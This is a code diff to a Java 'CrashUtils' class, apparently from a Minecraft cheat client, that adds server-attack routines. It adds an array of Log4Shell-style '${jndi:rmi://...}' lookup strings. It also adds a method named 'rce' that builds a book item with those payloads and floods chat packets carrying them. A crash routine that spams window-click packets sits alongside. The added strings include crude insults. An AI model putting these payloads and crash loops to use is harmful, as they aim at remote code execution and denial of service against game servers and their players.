@@ -57,6 +57,8 @@ public class CrashUtils {
             "/mv confirm"};
 
 
+    public String[] moon = {"{\"theresa.exe\":\"${jndi:rmi://du.pa}\"}}", "{\"pdw\"}", "[\"damn man\"]", "{\"such a gay rn\"}"};
+
     public String AlphabeticRandom(int count) {
         return RandomStringUtils.randomAlphabetic(count);
     }
@@ -259,9 +261,9 @@ public class CrashUtils {
     public void action2crash(int amount, int range) {
         int init = 0;
         while (init < amount) {
-                for (int i = 0; i < range; i++)
-                    Minecraft.getMinecraft().playerController.windowClick(Minecraft.getMinecraft().thePlayer.openContainer.windowId,
-                            i, 0, 0, Minecraft.getMinecraft().thePlayer);
+            for (int i = 0; i < range; i++)
+                Minecraft.getMinecraft().playerController.windowClick(Minecraft.getMinecraft().thePlayer.openContainer.windowId,
+                        i, 0, 0, Minecraft.getMinecraft().thePlayer);
             init++;
         }
     }
@@ -273,6 +275,29 @@ public class CrashUtils {
             init++;
         }
     }
+
+    public void rce(int amount) {
+        int init = 0;
+
+        NBTTagCompound comp = new NBTTagCompound();
+        NBTTagList list = new NBTTagList();
+        for (int i2 = 0; i2 < 1; i2++)
+            list.appendTag(new NBTTagString("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
+        comp.setString("author", Minecraft.getMinecraft().getSession().getUsername());
+        comp.setString("title", "null");
+        comp.setByte("resolved", (byte) 1);
+        comp.setTag("pages", list);
+        ItemStack stack = new ItemStack(Items.writable_book);
+        stack.setTagCompound(comp);
+        PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
+        buffer.writeItemStackToBuffer(stack);
+
+        while (init < amount) {
+            Main.INSTANCE.packetQueue.add(new C01PacketChatMessage("{\"petya.exe\":\"${jndi:rmi://google.com/a}\", \"petya.exe\":\"${jndi:rmi://google.com/a}\"x}}"));
+            init++;
+        }
+    }
+
 
     public void firework(int amount, CrashType type) {
 
